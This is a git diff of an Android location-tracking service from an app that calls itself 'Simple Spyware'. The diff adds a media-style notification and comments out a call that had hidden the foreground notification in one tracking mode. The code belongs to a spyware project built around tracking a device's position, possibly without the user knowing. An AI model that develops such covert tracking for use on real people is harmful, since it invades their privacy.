@@ -16,6 +16,7 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.os.Bundle;
 import android.os.IBinder;
+import android.support.v4.media.session.MediaSessionCompat;
 import android.util.Log;
 import androidx.core.app.NotificationCompat;
 import java.util.Calendar;
@@ -54,7 +55,7 @@ public class LocationTrackerService extends Service implements LocationListener 
                 Log.i(TAG, "STARTED LOCATION TRACKING: StartServiceLocationTracking");
                 startForegroundService();
                 startTracking();
-                stopForeground(true);
+//                stopForeground(true);
             }
             else if (intent.getAction() != null && intent.getAction().equals("StartServiceLocationTrackingVisible")) {
                 Log.i(TAG, "STARTED LOCATION TRACKING: StartServiceLocationTrackingVisible");
@@ -107,12 +108,14 @@ public class LocationTrackerService extends Service implements LocationListener 
         NotificationChannel channel = new NotificationChannel("1", "Location", NotificationManager.IMPORTANCE_LOW);
         NotificationManager notificationManager = getSystemService(NotificationManager.class);
         if(notificationManager != null){
+            MediaSessionCompat mediaSession = new MediaSessionCompat(getApplication(), "My Tag");
             notificationManager.createNotificationChannel(channel);
             NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "1")
                     .setSmallIcon(R.drawable.ic_remove_red_eye_black_24dp)
                     .setContentTitle("Simple Spyware")
                     .setContentText("Tracking your position!")
                     .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .setStyle(new androidx.media.app.NotificationCompat.MediaStyle().setMediaSession(mediaSession.getSessionToken()))
                     .setAutoCancel(true);
             Notification notification = builder.build();
             this.startForeground(1, notification);
